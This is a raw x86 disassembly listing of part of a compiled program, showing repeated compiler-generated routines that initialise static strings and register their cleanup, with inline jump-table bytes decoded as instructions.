  402661:	89 04 24             	mov    %eax,(%esp)
  402664:	e8 c3 3d 00 00       	call   0x40642c
  402669:	c7 04 24 58 13 40 00 	movl   $0x401358,(%esp)
  402670:	e8 eb ae 01 00       	call   0x41d560
  402675:	c6 05 48 ed 4a 00 01 	movb   $0x1,0x4aed48
  40267c:	83 3d 44 ed 4a 00 0f 	cmpl   $0xf,0x4aed44
  402683:	77 07                	ja     0x40268c
  402685:	be 30 ed 4a 00       	mov    $0x4aed30,%esi
  40268a:	eb 06                	jmp    0x402692
  40268c:	8b 35 30 ed 4a 00    	mov    0x4aed30,%esi
  402692:	89 3c 24             	mov    %edi,(%esp)
  402695:	e8 88 f9 01 00       	call   0x422022
  40269a:	89 f0                	mov    %esi,%eax
  40269c:	83 c4 6c             	add    $0x6c,%esp
  40269f:	5e                   	pop    %esi
  4026a0:	5f                   	pop    %edi
  4026a1:	5b                   	pop    %ebx
  4026a2:	5d                   	pop    %ebp
  4026a3:	c3                   	ret
  4026a4:	8b 45 a0             	mov    -0x60(%ebp),%eax
  4026a7:	3d 01 00 00 00       	cmp    $0x1,%eax
  4026ac:	76 02                	jbe    0x4026b0
  4026ae:	0f 0b                	ud2
  4026b0:	2d 01 00 00 00       	sub    $0x1,%eax
  4026b5:	ff 24 85 f8 26 40 00 	jmp    *0x4026f8(,%eax,4)
  4026bc:	8b 75 a8             	mov    -0x58(%ebp),%esi
  4026bf:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4026c2:	83 f8 10             	cmp    $0x10,%eax
  4026c5:	72 1f                	jb     0x4026e6
  4026c7:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4026ca:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4026cd:	40                   	inc    %eax
  4026ce:	3d 00 10 00 00       	cmp    $0x1000,%eax
  4026d3:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4026d6:	72 06                	jb     0x4026de
  4026d8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4026db:	8b 40 fc             	mov    -0x4(%eax),%eax
  4026de:	89 04 24             	mov    %eax,(%esp)
  4026e1:	e8 46 3d 00 00       	call   0x40642c
  4026e6:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  4026ed:	89 34 24             	mov    %esi,(%esp)
  4026f0:	e8 ab f8 01 00       	call   0x421fa0
  4026f5:	83 ec 04             	sub    $0x4,%esp
  4026f8:	bc 26 40 00 55       	mov    $0x55004026,%esp
  4026fd:	89 e5                	mov    %esp,%ebp
  4026ff:	53                   	push   %ebx
  402700:	57                   	push   %edi
  402701:	56                   	push   %esi
  402702:	83 ec 6c             	sub    $0x6c,%esp
  402705:	8a 1d 88 ed 4a 00    	mov    0x4aed88,%bl
  40270b:	c7 45 b8 98 13 42 00 	movl   $0x421398,-0x48(%ebp)
  402712:	c7 45 bc c4 35 42 00 	movl   $0x4235c4,-0x44(%ebp)
  402719:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  40271c:	89 65 c8             	mov    %esp,-0x38(%ebp)
  40271f:	c7 45 c0 d4 27 40 00 	movl   $0x4027d4,-0x40(%ebp)
  402726:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402729:	89 f8                	mov    %edi,%eax
  40272b:	e8 d1 f8 01 00       	call   0x422001
  402730:	84 db                	test   %bl,%bl
  402732:	75 78                	jne    0x4027ac
  402734:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  40273b:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  402742:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  402746:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  40274d:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  402750:	89 34 24             	mov    %esi,(%esp)
  402753:	c7 44 24 04 e3 31 42 	movl   $0x4231e3,0x4(%esp)
  40275a:	00 
  40275b:	e8 24 25 00 00       	call   0x404c84
  402760:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  402767:	89 74 24 04          	mov    %esi,0x4(%esp)
  40276b:	c7 04 24 6c ed 4a 00 	movl   $0x4aed6c,(%esp)
  402772:	e8 81 f5 ff ff       	call   0x401cf8
  402777:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40277a:	83 f9 10             	cmp    $0x10,%ecx
  40277d:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402780:	72 17                	jb     0x402799
  402782:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402785:	41                   	inc    %ecx
  402786:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40278c:	72 03                	jb     0x402791
  40278e:	8b 40 fc             	mov    -0x4(%eax),%eax
  402791:	89 04 24             	mov    %eax,(%esp)
  402794:	e8 93 3c 00 00       	call   0x40642c
  402799:	c7 04 24 f8 13 40 00 	movl   $0x4013f8,(%esp)
  4027a0:	e8 bb ad 01 00       	call   0x41d560
  4027a5:	c6 05 88 ed 4a 00 01 	movb   $0x1,0x4aed88
  4027ac:	83 3d 84 ed 4a 00 0f 	cmpl   $0xf,0x4aed84
  4027b3:	77 07                	ja     0x4027bc
  4027b5:	be 70 ed 4a 00       	mov    $0x4aed70,%esi
  4027ba:	eb 06                	jmp    0x4027c2
  4027bc:	8b 35 70 ed 4a 00    	mov    0x4aed70,%esi
  4027c2:	89 3c 24             	mov    %edi,(%esp)
  4027c5:	e8 58 f8 01 00       	call   0x422022
  4027ca:	89 f0                	mov    %esi,%eax
  4027cc:	83 c4 6c             	add    $0x6c,%esp
  4027cf:	5e                   	pop    %esi
  4027d0:	5f                   	pop    %edi
  4027d1:	5b                   	pop    %ebx
  4027d2:	5d                   	pop    %ebp
  4027d3:	c3                   	ret
  4027d4:	8b 45 a0             	mov    -0x60(%ebp),%eax
  4027d7:	3d 01 00 00 00       	cmp    $0x1,%eax
  4027dc:	76 02                	jbe    0x4027e0
  4027de:	0f 0b                	ud2
  4027e0:	2d 01 00 00 00       	sub    $0x1,%eax
  4027e5:	ff 24 85 28 28 40 00 	jmp    *0x402828(,%eax,4)
  4027ec:	8b 75 a8             	mov    -0x58(%ebp),%esi
  4027ef:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4027f2:	83 f8 10             	cmp    $0x10,%eax
  4027f5:	72 1f                	jb     0x402816
  4027f7:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4027fa:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4027fd:	40                   	inc    %eax
  4027fe:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402803:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402806:	72 06                	jb     0x40280e
  402808:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40280b:	8b 40 fc             	mov    -0x4(%eax),%eax
  40280e:	89 04 24             	mov    %eax,(%esp)
  402811:	e8 16 3c 00 00       	call   0x40642c
  402816:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  40281d:	89 34 24             	mov    %esi,(%esp)
  402820:	e8 7b f7 01 00       	call   0x421fa0
  402825:	83 ec 04             	sub    $0x4,%esp
  402828:	ec                   	in     (%dx),%al
  402829:	27                   	daa
  40282a:	40                   	inc    %eax
  40282b:	00 55 89             	add    %dl,-0x77(%ebp)
  40282e:	e5 53                	in     $0x53,%eax
  402830:	57                   	push   %edi
  402831:	56                   	push   %esi
  402832:	83 ec 6c             	sub    $0x6c,%esp
  402835:	8a 1d a8 ed 4a 00    	mov    0x4aeda8,%bl
  40283b:	c7 45 b8 98 13 42 00 	movl   $0x421398,-0x48(%ebp)
  402842:	c7 45 bc d4 35 42 00 	movl   $0x4235d4,-0x44(%ebp)
  402849:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  40284c:	89 65 c8             	mov    %esp,-0x38(%ebp)
  40284f:	c7 45 c0 04 29 40 00 	movl   $0x402904,-0x40(%ebp)
  402856:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402859:	89 f8                	mov    %edi,%eax
  40285b:	e8 a1 f7 01 00       	call   0x422001
  402860:	84 db                	test   %bl,%bl
  402862:	75 78                	jne    0x4028dc
  402864:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  40286b:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  402872:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  402876:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  40287d:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  402880:	89 34 24             	mov    %esi,(%esp)
  402883:	c7 44 24 04 1a 32 42 	movl   $0x42321a,0x4(%esp)
  40288a:	00 
  40288b:	e8 f4 23 00 00       	call   0x404c84
  402890:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  402897:	89 74 24 04          	mov    %esi,0x4(%esp)
  40289b:	c7 04 24 8c ed 4a 00 	movl   $0x4aed8c,(%esp)
  4028a2:	e8 51 f4 ff ff       	call   0x401cf8
  4028a7:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4028aa:	83 f9 10             	cmp    $0x10,%ecx
  4028ad:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  4028b0:	72 17                	jb     0x4028c9
  4028b2:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4028b5:	41                   	inc    %ecx
  4028b6:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4028bc:	72 03                	jb     0x4028c1
  4028be:	8b 40 fc             	mov    -0x4(%eax),%eax
  4028c1:	89 04 24             	mov    %eax,(%esp)
  4028c4:	e8 63 3b 00 00       	call   0x40642c
  4028c9:	c7 04 24 48 14 40 00 	movl   $0x401448,(%esp)
  4028d0:	e8 8b ac 01 00       	call   0x41d560
  4028d5:	c6 05 a8 ed 4a 00 01 	movb   $0x1,0x4aeda8
  4028dc:	83 3d a4 ed 4a 00 0f 	cmpl   $0xf,0x4aeda4
  4028e3:	77 07                	ja     0x4028ec
  4028e5:	be 90 ed 4a 00       	mov    $0x4aed90,%esi
  4028ea:	eb 06                	jmp    0x4028f2
  4028ec:	8b 35 90 ed 4a 00    	mov    0x4aed90,%esi
  4028f2:	89 3c 24             	mov    %edi,(%esp)
  4028f5:	e8 28 f7 01 00       	call   0x422022
  4028fa:	89 f0                	mov    %esi,%eax
  4028fc:	83 c4 6c             	add    $0x6c,%esp
  4028ff:	5e                   	pop    %esi
  402900:	5f                   	pop    %edi
  402901:	5b                   	pop    %ebx
  402902:	5d                   	pop    %ebp
  402903:	c3                   	ret
  402904:	8b 45 a0             	mov    -0x60(%ebp),%eax
  402907:	3d 01 00 00 00       	cmp    $0x1,%eax
  40290c:	76 02                	jbe    0x402910
  40290e:	0f 0b                	ud2
  402910:	2d 01 00 00 00       	sub    $0x1,%eax
  402915:	ff 24 85 58 29 40 00 	jmp    *0x402958(,%eax,4)
  40291c:	8b 75 a8             	mov    -0x58(%ebp),%esi
  40291f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402922:	83 f8 10             	cmp    $0x10,%eax
  402925:	72 1f                	jb     0x402946
  402927:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40292a:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40292d:	40                   	inc    %eax
  40292e:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402933:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402936:	72 06                	jb     0x40293e
  402938:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40293b:	8b 40 fc             	mov    -0x4(%eax),%eax
  40293e:	89 04 24             	mov    %eax,(%esp)
  402941:	e8 e6 3a 00 00       	call   0x40642c
  402946:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  40294d:	89 34 24             	mov    %esi,(%esp)
  402950:	e8 4b f6 01 00       	call   0x421fa0
  402955:	83 ec 04             	sub    $0x4,%esp
  402958:	1c 29                	sbb    $0x29,%al
  40295a:	40                   	inc    %eax
  40295b:	00 55 89             	add    %dl,-0x77(%ebp)
  40295e:	e5 53                	in     $0x53,%eax
  402960:	57                   	push   %edi
  402961:	56                   	push   %esi
  402962:	83 ec 6c             	sub    $0x6c,%esp
  402965:	8a 1d c8 ed 4a 00    	mov    0x4aedc8,%bl
  40296b:	c7 45 b8 98 13 42 00 	movl   $0x421398,-0x48(%ebp)
  402972:	c7 45 bc e4 35 42 00 	movl   $0x4235e4,-0x44(%ebp)
  402979:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  40297c:	89 65 c8             	mov    %esp,-0x38(%ebp)
  40297f:	c7 45 c0 34 2a 40 00 	movl   $0x402a34,-0x40(%ebp)
  402986:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402989:	89 f8                	mov    %edi,%eax
  40298b:	e8 71 f6 01 00       	call   0x422001
  402990:	84 db                	test   %bl,%bl
  402992:	75 78                	jne    0x402a0c
  402994:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  40299b:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  4029a2:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  4029a6:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  4029ad:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  4029b0:	89 34 24             	mov    %esi,(%esp)
  4029b3:	c7 44 24 04 51 32 42 	movl   $0x423251,0x4(%esp)
  4029ba:	00 
  4029bb:	e8 c4 22 00 00       	call   0x404c84
  4029c0:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  4029c7:	89 74 24 04          	mov    %esi,0x4(%esp)
  4029cb:	c7 04 24 ac ed 4a 00 	movl   $0x4aedac,(%esp)
  4029d2:	e8 21 f3 ff ff       	call   0x401cf8
  4029d7:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4029da:	83 f9 10             	cmp    $0x10,%ecx
  4029dd:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  4029e0:	72 17                	jb     0x4029f9
  4029e2:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4029e5:	41                   	inc    %ecx
  4029e6:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4029ec:	72 03                	jb     0x4029f1
  4029ee:	8b 40 fc             	mov    -0x4(%eax),%eax
  4029f1:	89 04 24             	mov    %eax,(%esp)
  4029f4:	e8 33 3a 00 00       	call   0x40642c
  4029f9:	c7 04 24 98 14 40 00 	movl   $0x401498,(%esp)
  402a00:	e8 5b ab 01 00       	call   0x41d560
  402a05:	c6 05 c8 ed 4a 00 01 	movb   $0x1,0x4aedc8
  402a0c:	83 3d c4 ed 4a 00 0f 	cmpl   $0xf,0x4aedc4
  402a13:	77 07                	ja     0x402a1c
  402a15:	be b0 ed 4a 00       	mov    $0x4aedb0,%esi
  402a1a:	eb 06                	jmp    0x402a22
  402a1c:	8b 35 b0 ed 4a 00    	mov    0x4aedb0,%esi
  402a22:	89 3c 24             	mov    %edi,(%esp)
  402a25:	e8 f8 f5 01 00       	call   0x422022
  402a2a:	89 f0                	mov    %esi,%eax
  402a2c:	83 c4 6c             	add    $0x6c,%esp
  402a2f:	5e                   	pop    %esi
  402a30:	5f                   	pop    %edi
  402a31:	5b                   	pop    %ebx
  402a32:	5d                   	pop    %ebp
  402a33:	c3                   	ret
  402a34:	8b 45 a0             	mov    -0x60(%ebp),%eax
  402a37:	3d 01 00 00 00       	cmp    $0x1,%eax
  402a3c:	76 02                	jbe    0x402a40
  402a3e:	0f 0b                	ud2
  402a40:	2d 01 00 00 00       	sub    $0x1,%eax
  402a45:	ff 24 85 88 2a 40 00 	jmp    *0x402a88(,%eax,4)
  402a4c:	8b 75 a8             	mov    -0x58(%ebp),%esi
  402a4f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402a52:	83 f8 10             	cmp    $0x10,%eax
  402a55:	72 1f                	jb     0x402a76
  402a57:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  402a5a:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402a5d:	40                   	inc    %eax
  402a5e:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402a63:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402a66:	72 06                	jb     0x402a6e
  402a68:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402a6b:	8b 40 fc             	mov    -0x4(%eax),%eax
  402a6e:	89 04 24             	mov    %eax,(%esp)
  402a71:	e8 b6 39 00 00       	call   0x40642c
  402a76:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402a7d:	89 34 24             	mov    %esi,(%esp)
  402a80:	e8 1b f5 01 00       	call   0x421fa0
  402a85:	83 ec 04             	sub    $0x4,%esp
  402a88:	4c                   	dec    %esp
  402a89:	2a 40 00             	sub    0x0(%eax),%al
  402a8c:	55                   	push   %ebp
  402a8d:	89 e5                	mov    %esp,%ebp
  402a8f:	53                   	push   %ebx
  402a90:	57                   	push   %edi
  402a91:	56                   	push   %esi
  402a92:	83 ec 6c             	sub    $0x6c,%esp
  402a95:	8a 1d e8 ed 4a 00    	mov    0x4aede8,%bl
  402a9b:	c7 45 b8 98 13 42 00 	movl   $0x421398,-0x48(%ebp)
  402aa2:	c7 45 bc f4 35 42 00 	movl   $0x4235f4,-0x44(%ebp)
  402aa9:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  402aac:	89 65 c8             	mov    %esp,-0x38(%ebp)
  402aaf:	c7 45 c0 64 2b 40 00 	movl   $0x402b64,-0x40(%ebp)
  402ab6:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402ab9:	89 f8                	mov    %edi,%eax
  402abb:	e8 41 f5 01 00       	call   0x422001
  402ac0:	84 db                	test   %bl,%bl
  402ac2:	75 78                	jne    0x402b3c
  402ac4:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  402acb:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  402ad2:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  402ad6:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402add:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  402ae0:	89 34 24             	mov    %esi,(%esp)
  402ae3:	c7 44 24 04 7c 32 42 	movl   $0x42327c,0x4(%esp)
  402aea:	00 
  402aeb:	e8 94 21 00 00       	call   0x404c84
  402af0:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  402af7:	89 74 24 04          	mov    %esi,0x4(%esp)
  402afb:	c7 04 24 cc ed 4a 00 	movl   $0x4aedcc,(%esp)
  402b02:	e8 f1 f1 ff ff       	call   0x401cf8
  402b07:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402b0a:	83 f9 10             	cmp    $0x10,%ecx
  402b0d:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402b10:	72 17                	jb     0x402b29
  402b12:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402b15:	41                   	inc    %ecx
  402b16:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402b1c:	72 03                	jb     0x402b21
  402b1e:	8b 40 fc             	mov    -0x4(%eax),%eax
  402b21:	89 04 24             	mov    %eax,(%esp)
  402b24:	e8 03 39 00 00       	call   0x40642c
  402b29:	c7 04 24 e8 14 40 00 	movl   $0x4014e8,(%esp)
  402b30:	e8 2b aa 01 00       	call   0x41d560
  402b35:	c6 05 e8 ed 4a 00 01 	movb   $0x1,0x4aede8
  402b3c:	83 3d e4 ed 4a 00 0f 	cmpl   $0xf,0x4aede4
  402b43:	77 07                	ja     0x402b4c
  402b45:	be d0 ed 4a 00       	mov    $0x4aedd0,%esi
  402b4a:	eb 06                	jmp    0x402b52
  402b4c:	8b 35 d0 ed 4a 00    	mov    0x4aedd0,%esi
  402b52:	89 3c 24             	mov    %edi,(%esp)
  402b55:	e8 c8 f4 01 00       	call   0x422022
  402b5a:	89 f0                	mov    %esi,%eax
  402b5c:	83 c4 6c             	add    $0x6c,%esp
  402b5f:	5e                   	pop    %esi
  402b60:	5f                   	pop    %edi
  402b61:	5b                   	pop    %ebx
  402b62:	5d                   	pop    %ebp
  402b63:	c3                   	ret
  402b64:	8b 45 a0             	mov    -0x60(%ebp),%eax
  402b67:	3d 01 00 00 00       	cmp    $0x1,%eax
  402b6c:	76 02                	jbe    0x402b70
  402b6e:	0f 0b                	ud2
  402b70:	2d 01 00 00 00       	sub    $0x1,%eax
  402b75:	ff 24 85 b8 2b 40 00 	jmp    *0x402bb8(,%eax,4)
  402b7c:	8b 75 a8             	mov    -0x58(%ebp),%esi
  402b7f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402b82:	83 f8 10             	cmp    $0x10,%eax
  402b85:	72 1f                	jb     0x402ba6
  402b87:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  402b8a:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402b8d:	40                   	inc    %eax
  402b8e:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402b93:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402b96:	72 06                	jb     0x402b9e
  402b98:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402b9b:	8b 40 fc             	mov    -0x4(%eax),%eax
  402b9e:	89 04 24             	mov    %eax,(%esp)
  402ba1:	e8 86 38 00 00       	call   0x40642c
  402ba6:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402bad:	89 34 24             	mov    %esi,(%esp)
  402bb0:	e8 eb f3 01 00       	call   0x421fa0
  402bb5:	83 ec 04             	sub    $0x4,%esp
  402bb8:	7c 2b                	jl     0x402be5
  402bba:	40                   	inc    %eax
  402bbb:	00 55 89             	add    %dl,-0x77(%ebp)
  402bbe:	e5 53                	in     $0x53,%eax
  402bc0:	57                   	push   %edi
  402bc1:	56                   	push   %esi
  402bc2:	83 ec 6c             	sub    $0x6c,%esp
  402bc5:	8a 1d 08 ee 4a 00    	mov    0x4aee08,%bl
  402bcb:	c7 45 b8 98 13 42 00 	movl   $0x421398,-0x48(%ebp)
  402bd2:	c7 45 bc 04 36 42 00 	movl   $0x423604,-0x44(%ebp)
  402bd9:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  402bdc:	89 65 c8             	mov    %esp,-0x38(%ebp)
  402bdf:	c7 45 c0 94 2c 40 00 	movl   $0x402c94,-0x40(%ebp)
  402be6:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402be9:	89 f8                	mov    %edi,%eax
  402beb:	e8 11 f4 01 00       	call   0x422001
  402bf0:	84 db                	test   %bl,%bl
  402bf2:	75 78                	jne    0x402c6c
  402bf4:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  402bfb:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  402c02:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  402c06:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402c0d:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  402c10:	89 34 24             	mov    %esi,(%esp)
  402c13:	c7 44 24 04 b6 32 42 	movl   $0x4232b6,0x4(%esp)
  402c1a:	00 
  402c1b:	e8 64 20 00 00       	call   0x404c84
  402c20:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  402c27:	89 74 24 04          	mov    %esi,0x4(%esp)
  402c2b:	c7 04 24 ec ed 4a 00 	movl   $0x4aedec,(%esp)
  402c32:	e8 c1 f0 ff ff       	call   0x401cf8
  402c37:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402c3a:	83 f9 10             	cmp    $0x10,%ecx
  402c3d:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402c40:	72 17                	jb     0x402c59
  402c42:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402c45:	41                   	inc    %ecx
  402c46:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402c4c:	72 03                	jb     0x402c51
  402c4e:	8b 40 fc             	mov    -0x4(%eax),%eax
  402c51:	89 04 24             	mov    %eax,(%esp)
  402c54:	e8 d3 37 00 00       	call   0x40642c
  402c59:	c7 04 24 38 15 40 00 	movl   $0x401538,(%esp)
  402c60:	e8 fb a8 01 00       	call   0x41d560
  402c65:	c6 05 08 ee 4a 00 01 	movb   $0x1,0x4aee08
  402c6c:	83 3d 04 ee 4a 00 0f 	cmpl   $0xf,0x4aee04
  402c73:	77 07                	ja     0x402c7c
  402c75:	be f0 ed 4a 00       	mov    $0x4aedf0,%esi
  402c7a:	eb 06                	jmp    0x402c82
  402c7c:	8b 35 f0 ed 4a 00    	mov    0x4aedf0,%esi
  402c82:	89 3c 24             	mov    %edi,(%esp)
  402c85:	e8 98 f3 01 00       	call   0x422022
  402c8a:	89 f0                	mov    %esi,%eax
  402c8c:	83 c4 6c             	add    $0x6c,%esp
  402c8f:	5e                   	pop    %esi
  402c90:	5f                   	pop    %edi
  402c91:	5b                   	pop    %ebx
  402c92:	5d                   	pop    %ebp
  402c93:	c3                   	ret
  402c94:	8b 45 a0             	mov    -0x60(%ebp),%eax
  402c97:	3d 01 00 00 00       	cmp    $0x1,%eax
  402c9c:	76 02                	jbe    0x402ca0
  402c9e:	0f 0b                	ud2
  402ca0:	2d 01 00 00 00       	sub    $0x1,%eax
  402ca5:	ff 24 85 e8 2c 40 00 	jmp    *0x402ce8(,%eax,4)
  402cac:	8b 75 a8             	mov    -0x58(%ebp),%esi
  402caf:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402cb2:	83 f8 10             	cmp    $0x10,%eax
  402cb5:	72 1f                	jb     0x402cd6
  402cb7:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  402cba:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402cbd:	40                   	inc    %eax
  402cbe:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402cc3:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402cc6:	72 06                	jb     0x402cce
  402cc8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402ccb:	8b 40 fc             	mov    -0x4(%eax),%eax
  402cce:	89 04 24             	mov    %eax,(%esp)
  402cd1:	e8 56 37 00 00       	call   0x40642c
  402cd6:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402cdd:	89 34 24             	mov    %esi,(%esp)
  402ce0:	e8 bb f2 01 00       	call   0x421fa0
  402ce5:	83 ec 04             	sub    $0x4,%esp
  402ce8:	ac                   	lods   %ds:(%esi),%al
  402ce9:	2c 40                	sub    $0x40,%al
  402ceb:	00 55 89             	add    %dl,-0x77(%ebp)
  402cee:	e5 53                	in     $0x53,%eax
  402cf0:	57                   	push   %edi
  402cf1:	56                   	push   %esi
  402cf2:	83 ec 6c             	sub    $0x6c,%esp
  402cf5:	8a 1d 48 ee 4a 00    	mov    0x4aee48,%bl
  402cfb:	c7 45 b8 98 13 42 00 	movl   $0x421398,-0x48(%ebp)
  402d02:	c7 45 bc 14 36 42 00 	movl   $0x423614,-0x44(%ebp)
  402d09:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  402d0c:	89 65 c8             	mov    %esp,-0x38(%ebp)
  402d0f:	c7 45 c0 c4 2d 40 00 	movl   $0x402dc4,-0x40(%ebp)
  402d16:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402d19:	89 f8                	mov    %edi,%eax
  402d1b:	e8 e1 f2 01 00       	call   0x422001
  402d20:	84 db                	test   %bl,%bl
  402d22:	75 78                	jne    0x402d9c
  402d24:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  402d2b:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  402d32:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  402d36:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402d3d:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  402d40:	89 34 24             	mov    %esi,(%esp)
  402d43:	c7 44 24 04 33 33 42 	movl   $0x423333,0x4(%esp)
  402d4a:	00 
  402d4b:	e8 34 1f 00 00       	call   0x404c84
  402d50:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  402d57:	89 74 24 04          	mov    %esi,0x4(%esp)
  402d5b:	c7 04 24 2c ee 4a 00 	movl   $0x4aee2c,(%esp)
  402d62:	e8 91 ef ff ff       	call   0x401cf8
  402d67:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402d6a:	83 f9 10             	cmp    $0x10,%ecx
  402d6d:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402d70:	72 17                	jb     0x402d89
  402d72:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402d75:	41                   	inc    %ecx
  402d76:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402d7c:	72 03                	jb     0x402d81
  402d7e:	8b 40 fc             	mov    -0x4(%eax),%eax
  402d81:	89 04 24             	mov    %eax,(%esp)
  402d84:	e8 a3 36 00 00       	call   0x40642c
  402d89:	c7 04 24 d8 15 40 00 	movl   $0x4015d8,(%esp)
  402d90:	e8 cb a7 01 00       	call   0x41d560
  402d95:	c6 05 48 ee 4a 00 01 	movb   $0x1,0x4aee48
  402d9c:	83 3d 44 ee 4a 00 0f 	cmpl   $0xf,0x4aee44
  402da3:	77 07                	ja     0x402dac
  402da5:	be 30 ee 4a 00       	mov    $0x4aee30,%esi
  402daa:	eb 06                	jmp    0x402db2
  402dac:	8b 35 30 ee 4a 00    	mov    0x4aee30,%esi
  402db2:	89 3c 24             	mov    %edi,(%esp)
  402db5:	e8 68 f2 01 00       	call   0x422022
